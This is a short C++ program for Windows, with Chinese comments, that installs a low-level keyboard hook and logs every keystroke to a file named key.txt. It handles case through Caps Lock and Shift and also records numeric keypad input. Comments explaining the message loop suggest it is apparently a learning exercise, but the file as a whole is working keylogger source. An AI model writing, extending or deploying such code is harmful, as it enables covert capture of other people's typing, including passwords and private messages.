#include <iostream>  
#include <string>  
#include <fstream>
#include <windows.h>
using namespace std;

//全局变量
HHOOK glhHook = NULL;			//安装的鼠标勾子句柄 
BOOL g_bCapsLock = FALSE;		//大小写锁定键	
BOOL g_bShift = FALSE;			//shift键
ofstream SaveFile("key.txt");

//键盘钩子回调函数
LRESULT  CALLBACK  KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

	char c[2];
	c[1] = 0;
	cout << "ww" << endl;
	if ((wParam == WM_KEYDOWN) && (HC_ACTION == nCode)) {		//有键按下

		KBDLLHOOKSTRUCT *  keyNum = (KBDLLHOOKSTRUCT *)lParam;

		//处理字母大小写
		if ((keyNum->vkCode == VK_CAPITAL) || (keyNum->vkCode == VK_LSHIFT) || (keyNum->vkCode == VK_RETURN) || (keyNum->vkCode >= 65 && keyNum->vkCode <= 90)) {

			if (!GetKeyState(VK_CAPITAL)) {	//如果大写锁定键未被按下
				g_bCapsLock = FALSE;
			}
			else {
				g_bCapsLock = TRUE;
			}

			if (GetAsyncKeyState(VK_LSHIFT) & 0x8000) { //如果shift键被按住
				g_bShift = TRUE;
			}
			else {
				g_bShift = FALSE;
			}

			if (keyNum->vkCode >= 65 && keyNum->vkCode <= 90) {
				BOOL flag = g_bCapsLock^g_bShift;//同假异真
				if (flag) {
					c[0] = keyNum->vkCode;
				}
				else {
					c[0] = keyNum->vkCode + 32;
				}
				SaveFile << (int)c[0] << " : " << c << endl;
			}
		}
		//处理数字小键盘
		else if (keyNum->vkCode == 144 || (keyNum->vkCode >= VK_NUMPAD0 && keyNum->vkCode <= VK_NUMPAD9)) { //144表示数字小键盘锁键

			if (GetKeyState(144)) {		//如果数字小键盘锁键被按下
				int mapKey = keyNum->vkCode - 48;
				SaveFile << keyNum->vkCode << " : " << char(mapKey) << endl;
			}

		}
		else {
			SaveFile << keyNum->vkCode << " : " << char(keyNum->vkCode) << endl;
		}
	}
	//return 1    将阻止其他进程（程序）获取键盘信息
	return CallNextHookEx(glhHook, nCode, wParam, lParam);
}
/*

GetMessage是从调用线程的消息队列里取得一个消息并将其放于指定的结构。此函数可取得与指定窗口联系的消息和由PostThreadMessage寄送的线程消息。
此函数接收一定范围的消息值。GetMessage不接收属于其他线程或应用程序的消息。获取消息成功后，线程将从消息队列中删除该消息。
函数会一直等待直到有消息到来才有返回值。

*/


int main()
{
	HHOOK mouseHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), NULL);
	MSG msg;
  //防止程序退出，并且监听控制台消息事件，没有消息时就等待，这时可以执行其他方法（SetWindowsHookExA），如果while(1)的话，那么该语句一直不释放，执行不了其他语句	
	while (GetMessage(&msg, NULL, NULL, NULL))                
	{
	   /*
	   这步没有执行到，所以直接GetMessage(&msg, NULL, NULL, NULL)就可行了，不用while。GetMessage里面可能是一直用该（该文本就代表主线程）主线程执行去（过段时间就去，等同js延时，
	   延时的时候去查找可执行代码，也就是SetWindowsHookExA，SetWindowsHookExA再去获取键盘消息，然后获取完该子线程又延时，然后又去执行可执行代码，也就是GetMessage）获取消息，
	   而SetWindowsHookExA里面可能开了子线程来执行，并且里面可能也延时来让程序可以执行其他代码，但这里接下来可执行代码是主线程的return 0，主线程执行这个会退出，所以GetMessage防止主线程退出
	   */
	}
	UnhookWindowsHookEx(mouseHook);
	return 0;
}
